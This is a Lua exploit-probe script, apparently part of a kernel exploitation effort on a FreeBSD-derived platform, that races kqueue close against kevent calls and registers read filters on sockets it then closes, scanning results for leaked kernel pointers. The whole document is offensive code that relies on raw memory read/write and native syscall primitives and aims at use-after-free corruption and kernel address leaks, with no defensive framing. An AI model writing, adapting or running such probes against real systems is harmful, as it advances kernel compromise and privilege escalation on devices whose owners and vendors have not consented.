-- CRASH_CLASS: HIGH
-- PROBE 143a: kqueue close race + EVFILT_READ cross-socket confusion
--
-- Context: kqueue works (probes 20/21), kevent with zero timeout works.
-- Threads work (126h). Race: close a kqueue fd while another thread
-- calls kevent() on it. The kernel's kqueue_close() frees the kqueue
-- struct while kevent() may still be scanning its knote list.
--
-- Also: register EVFILT_READ on a socket, close the socket, then
-- kevent() may return stale knote referencing freed socket — info leak.

print("=== PROBE 143a: KQUEUE CLOSE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 143a COMPLETE ===")
    return
end

local thrd_create = fcall(libc_addrofs.Thrd_create)
local thrd_join = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

-- kqueue() = sys 362
-- kevent() = sys 363
-- struct kevent { uintptr_t ident; short filter; u_short flags;
--                 u_int fflags; intptr_t data; void *udata; }
-- sizeof(kevent) = 32 on amd64

local SYS_KQUEUE = 362
local SYS_KEVENT = 363
local EVFILT_READ = -1
local EVFILT_WRITE = -2
local EV_ADD = 0x0001
local EV_DELETE = 0x0002
local EV_ENABLE = 0x0004
local EV_ONESHOT = 0x0010
local EV_ERROR = 0x4000

-- ============================================================
-- PHASE 1: kqueue + kevent verify
-- ============================================================
print("")
print("--- PHASE 1: KQUEUE VERIFY ---")

local kq = to_num(native.fcall_with_rax(stub, SYS_KQUEUE))
print("kqueue() fd=" .. kq)

if kq < 0 then
    print("kqueue failed — aborting")
    print("=== PROBE 143a COMPLETE ===")
    return
end

-- Create a socket to monitor
local sock = to_num(native.fcall_with_rax(stub, 97, 2, 2, 17)) -- UDP
print("socket fd=" .. sock)

-- Register EVFILT_READ on the socket
local changelist = memory.alloc(32)
-- kevent: ident=sock, filter=EVFILT_READ, flags=EV_ADD
safe_wq(changelist, uint64(sock))                    -- ident
safe_wd(changelist + 8, 0xFFFF)                       -- filter = -1 (EVFILT_READ) as short
safe_wd(changelist + 8, bit32.bor(0xFFFF0000, EV_ADD)) -- filter=-1, flags=EV_ADD
-- Actually need to pack correctly:
-- offset 0: ident (8 bytes)
-- offset 8: filter (2 bytes) + flags (2 bytes) + fflags (4 bytes)
-- offset 16: data (8 bytes)
-- offset 24: udata (8 bytes)
safe_wq(changelist, uint64(sock))
-- filter = EVFILT_READ = -1 = 0xFFFF, flags = EV_ADD = 1
-- Pack as: filter(16bit) | flags(16bit) | fflags(32bit)
safe_wd(changelist + 8, 0x0001FFFF)  -- flags=0x0001(EV_ADD), filter=0xFFFF(-1)
safe_wd(changelist + 12, 0)          -- fflags
safe_wq(changelist + 16, uint64(0))  -- data
safe_wq(changelist + 24, uint64(0))  -- udata

local eventlist = memory.alloc(64)
safe_wq(eventlist, uint64(0))

-- timeout = 0 (poll)
local timeout = memory.alloc(16)
safe_wq(timeout, uint64(0))   -- tv_sec = 0
safe_wq(timeout + 8, uint64(0)) -- tv_nsec = 0

local kev = to_num(native.fcall_with_rax(stub, SYS_KEVENT,
    kq, to_num(changelist), 1, to_num(eventlist), 1, to_num(timeout)))
print("kevent(add EVFILT_READ) ret=" .. kev)

-- Check if event was returned
if kev > 0 then
    local ev_ident = safe_rq(eventlist)
    local ev_filter_flags = safe_rd(eventlist + 8)
    local ev_data = safe_rq(eventlist + 16)
    local ev_udata = safe_rq(eventlist + 24)
    print("  event: ident=" .. fmt_addr(ev_ident) ..
          " filter_flags=0x" .. string.format("%08X", ev_filter_flags or 0) ..
          " data=" .. fmt_addr(ev_data))
    if is_kptr(ev_data) then print("  *** KPTR in event data ***") end
    if is_kptr(ev_udata) then print("  *** KPTR in event udata ***") end
end

native.fcall_with_rax(stub, 6, sock)
native.fcall_with_rax(stub, 6, kq)
print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: kqueue close race
-- ============================================================
print("")
print("--- PHASE 2: KQUEUE CLOSE RACE ---")

local RACE_ROUNDS = 150
local race_hits = 0

for round = 1, RACE_ROUNDS do
    local kq2 = to_num(native.fcall_with_rax(stub, SYS_KQUEUE))
    if kq2 < 0 then break end

    local s2 = to_num(native.fcall_with_rax(stub, 97, 2, 2, 17))
    if s2 < 0 then
        native.fcall_with_rax(stub, 6, kq2)
        break
    end

    -- Register event
    safe_wq(changelist, uint64(s2))
    safe_wd(changelist + 8, 0x0001FFFF)
    native.fcall_with_rax(stub, SYS_KEVENT,
        kq2, to_num(changelist), 1, 0, 0, to_num(timeout))

    -- Thread: scheduling pressure
    local shared = memory.alloc(8)
    safe_wq(shared, uint64(0))
    local thr = memory.alloc(8)
    pcall(thrd_create, thr, atomic_fn, uint64(to_num(shared)))

    -- RACE: close kqueue while kevent might be in-flight
    native.fcall_with_rax(stub, 6, kq2)

    -- Try kevent on closed kqueue fd
    safe_wq(eventlist, uint64(0))
    local race_ret = to_num(native.fcall_with_rax(stub, SYS_KEVENT,
        kq2, 0, 0, to_num(eventlist), 1, to_num(timeout)))

    if race_ret >= 0 then
        race_hits = race_hits + 1
        if race_hits <= 5 then
            print(string.format("  *** HIT round %d: kevent after close ret=%d ***", round, race_ret))
            if race_ret > 0 then
                for off = 0, 24, 8 do
                    local v = safe_rq(eventlist + off)
                    if is_kptr(v) then
                        print(string.format("    KPTR at +0x%X: %s", off, fmt_addr(v)))
                    end
                end
            end
        end
    end

    native.fcall_with_rax(stub, 6, s2)
    pcall(thrd_join, memory.read_qword(thr), uint64(0))

    if round % 50 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            return
        end
        print("  progress: " .. round .. "/" .. RACE_ROUNDS .. " hits=" .. race_hits)
    end
end

print("kqueue close race hits: " .. race_hits)
print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: EVFILT_READ stale knote after socket close
-- ============================================================
print("")
print("--- PHASE 3: STALE KNOTE ---")

local stale_hits = 0

for round = 1, 100 do
    local kq3 = to_num(native.fcall_with_rax(stub, SYS_KQUEUE))
    if kq3 < 0 then break end

    -- Create 8 sockets, register EVFILT_READ on all
    local socks = {}
    for i = 1, 8 do
        local s = to_num(native.fcall_with_rax(stub, 97, 28, 2, 0)) -- AF_INET6 DGRAM
        if s >= 0 then
            socks[#socks + 1] = s
            safe_wq(changelist, uint64(s))
            safe_wd(changelist + 8, 0x0001FFFF)
            native.fcall_with_rax(stub, SYS_KEVENT,
                kq3, to_num(changelist), 1, 0, 0, to_num(timeout))
        end
    end

    -- Close half the sockets (knotes become stale)
    for i = 1, #socks, 2 do
        native.fcall_with_rax(stub, 6, socks[i])
        socks[i] = -1
    end

    -- Poll kevent — stale knotes may leak kernel pointers
    safe_wq(eventlist, uint64(0))
    safe_wq(eventlist + 32, uint64(0))
    local kr = to_num(native.fcall_with_rax(stub, SYS_KEVENT,
        kq3, 0, 0, to_num(eventlist), 2, to_num(timeout)))

    if kr > 0 then
        for ev = 0, kr - 1 do
            local base = eventlist + ev * 32
            local ev_data = safe_rq(base + 16)
            local ev_udata = safe_rq(base + 24)
            if is_kptr(ev_data) then
                stale_hits = stale_hits + 1
                print(string.format("  *** STALE KPTR round %d: data=%s ***", round, fmt_addr(ev_data)))
            end
            if is_kptr(ev_udata) then
                stale_hits = stale_hits + 1
                print(string.format("  *** STALE KPTR round %d: udata=%s ***", round, fmt_addr(ev_udata)))
            end
        end
    end

    -- Cleanup
    for _, s in ipairs(socks) do
        if s >= 0 then native.fcall_with_rax(stub, 6, s) end
    end
    native.fcall_with_rax(stub, 6, kq3)

    if round % 25 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            return
        end
        print("  progress: " .. round .. "/100 stale_hits=" .. stale_hits)
    end
end

print("Stale knote kernel pointer hits: " .. stale_hits)

local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 143a COMPLETE ===")
